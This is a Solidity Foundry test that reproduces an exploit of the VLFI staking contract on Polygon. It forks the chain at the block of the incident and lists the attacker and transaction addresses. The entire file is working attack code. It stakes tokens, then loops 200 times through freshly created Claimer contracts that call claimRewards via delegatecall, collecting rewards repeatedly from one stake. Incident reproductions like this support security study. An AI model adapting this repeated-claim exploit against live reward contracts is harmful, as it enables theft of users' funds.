// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~36K USD$
// Attacker : https://polygonscan.com/address/0x11576cb3d8d6328cf319e85b10e09a228e84a8de
// Attack Contract : https://polygonscan.com/address/0x43623b96936e854f8d85f893011f22ac91e58164
// Vulnerable Contract : https://polygonscan.com/address/0xfc604b6fd73a1bc60d31be111f798dd0d4137812
// Attack Tx : https://polygonscan.com/tx/0xdd82fde0cc2fb7bdc078aead655f6d5e75a267a47c33fa92b658e3573b93ef0c
// Attack Tx : https://polygonscan.com/tx/0x051f80a7ef69e1ffad889ec7e1f7d29a9e80883156b5c8528438b5bb8b7a689a

// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0xe6e5f921c8cd480030efb16166c3f83abc85298d#code

// @Analysis
// Twitter Guy : https://twitter.com/AnciliaInc/status/1660767088699666433

interface IVLFI is IERC20 {
    function claimRewards(address to) external;
    function stake(address onBehalfOf, uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 LFI = IERC20(0x77D97db5615dFE8a2D16b38EAa3f8f34524a0a74);
    IVLFI VLFI = IVLFI(0xfc604b6fD73a1bc60d31be111F798dd0D4137812);
    Claimer claimer;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("polygon", 43_025_776);
        cheats.label(address(LFI), "LFI");
        cheats.label(address(VLFI), "VLFI");
    }

    function testExploit() external {
        deal(address(LFI), address(this), 86_000 * 1e18);
        claimer = new Claimer();
        LFI.approve(address(VLFI), type(uint256).max);
        VLFI.stake(address(claimer), LFI.balanceOf(address(this)));
        for (uint256 i; i < 200; i++) {
            address newClaimer = claimer.delegate(VLFI.balanceOf(address(claimer)), address(this));
            claimer = Claimer(newClaimer);
        }

        emit log_named_decimal_uint("Attacker LFI balance after exploit", LFI.balanceOf(address(this)), LFI.decimals());
    }

    function claimReward(uint256 VLFITransferAmount, address owner) external returns (address) {
        VLFI.claimRewards(owner);
        claimer = new Claimer();
        VLFI.transfer(address(claimer), VLFITransferAmount);
        return address(claimer);
    }
}

contract Claimer is Test {
    IERC20 LFI = IERC20(0x77D97db5615dFE8a2D16b38EAa3f8f34524a0a74);
    IVLFI VLFI = IVLFI(0xfc604b6fD73a1bc60d31be111F798dd0D4137812);
    Claimer claimer;

    function delegate(uint256 VLFITransferAmount, address owner) external returns (address) {
        (, bytes memory returnData) =
            msg.sender.delegatecall(abi.encodeWithSignature("claimReward(uint256,address)", VLFITransferAmount, owner));
        return abi.decode(returnData, (address));
    }
}
